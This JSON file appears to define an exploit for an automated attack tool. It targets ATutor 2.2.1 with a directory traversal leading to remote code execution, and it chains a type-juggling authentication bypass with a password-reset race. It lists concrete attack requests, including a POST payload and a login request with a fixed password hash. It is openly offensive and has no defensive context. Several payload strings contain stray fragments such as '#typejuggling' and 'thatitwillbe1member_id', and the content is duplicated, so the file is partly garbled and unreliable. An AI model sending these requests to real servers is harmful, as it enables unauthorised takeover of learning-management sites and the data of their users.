{
   "title" : "ATutor 2.2.1 Directory Traversal / Remote Code Execution",
   "variables" : {
      "E" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "PATH" : {
         "VALUE" : "/ATutor/",
         "DESCRIPTION" : "The path of Atutor"
      }
   },
   "payload" : "auto_login=&code=0#typejuggling&",
   "platform" : "ALL",
   "method" : "POST",
   "description" : "\n\n         This module exploits a directory traversal vulnerability in ATutor on an Apache/PHP\n\n         setup with display_errors set to On, which can be used to allow us to upload a malicious\n\n         ZIP file. On the web application, a blacklist verification is performed before extraction,\n\n         however it is not sufficient to prevent exploitation.\n\n\n\n         You are required to login to the target to reach the vulnerability, however this can be\n\n         done as a student account and remote registration is enabled by default.\n\n\n\n         Just in case remote registration isn't enabled, this module uses 2 vulnerabilities\n\n         in order to bypass the authentication:\n\n\n\n         1. confirm.php Authentication Bypass Type Juggling vulnerability\n\n         2. password_reminder.php Remote Password Reset TOCTOU vulnerability\n\n      ",
   "requests" : {
      "EXPLOIT3" : {
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "TEXT" : "Sending Exploit #3 Request : [POST] /login.php",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "PAYLOAD" : "form_password_hidden=8b891b2893ed75e69beee290ade9df6197cadf23&form_login=__USERNAME__&submit=Login&token=",
         "METHOD" : "POST",
         "PATH" : "login.php"
      }
   },
   "paths" : [
      "ATutor/"
   ],
   "name" : "AtutorFilemanagerTraversal",
   "msf_module" : "atutor_filemanager_traversal",
   "references" : [
      "http://www.atutor.ca/",
      "http://sourceincite.com/research/src-2016-09/",
      "http://sourceincite.com/research/src-2016-10/",
      "http://sourceincite.com/research/src-2016-11/",
      "https://github.com/atutor/ATutor/pull/107"
   ],
   "path" : "h=&e=__E__&#thebruteforceid=&m=&thatitwillbe1member_id=1&",
   "type" : "MSF",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "detection" : {},
   "informations" : {
      "MSF_MODULE" : "atutor_filemanager_traversal",
      "VARIABLES" : {
         "E" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "PATH" : {
            "VALUE" : "/ATutor/",
            "DESCRIPTION" : "The path of Atutor"
         }
      },
      "DESCRIPTION" : "\n\n         This module exploits a directory traversal vulnerability in ATutor on an Apache/PHP\n\n         setup with display_errors set to On, which can be used to allow us to upload a malicious\n\n         ZIP file. On the web application, a blacklist verification is performed before extraction,\n\n         however it is not sufficient to prevent exploitation.\n\n\n\n         You are required to login to the target to reach the vulnerability, however this can be\n\n         done as a student account and remote registration is enabled by default.\n\n\n\n         Just in case remote registration isn't enabled, this module uses 2 vulnerabilities\n\n         in order to bypass the authentication:\n\n\n\n         1. confirm.php Authentication Bypass Type Juggling vulnerability\n\n         2. password_reminder.php Remote Password Reset TOCTOU vulnerability\n\n      ",
      "PAYLOAD" : "auto_login=&code=0#typejuggling&",
      "name" : "AtutorFilemanagerTraversal",
      "REQUESTS" : {
         "EXPLOIT3" : {
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "TEXT" : "Sending Exploit #3 Request : [POST] /login.php",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "PAYLOAD" : "form_password_hidden=8b891b2893ed75e69beee290ade9df6197cadf23&form_login=__USERNAME__&submit=Login&token=",
            "METHOD" : "POST",
            "PATH" : "login.php"
         }
      },
      "TITLE" : "ATutor 2.2.1 Directory Traversal / Remote Code Execution",
      "PATH" : "h=&e=__E__&#thebruteforceid=&m=&thatitwillbe1member_id=1&",
      "METHOD" : "POST",
      "PLATFORM" : "ALL",
      "TYPE" : "MSF",
      "PATHS" : [
         "ATutor/"
      ],
      "REFERENCES" : [
         "http://www.atutor.ca/",
         "http://sourceincite.com/research/src-2016-09/",
         "http://sourceincite.com/research/src-2016-10/",
         "http://sourceincite.com/research/src-2016-11/",
         "https://github.com/atutor/ATutor/pull/107"
      ]
   }
}
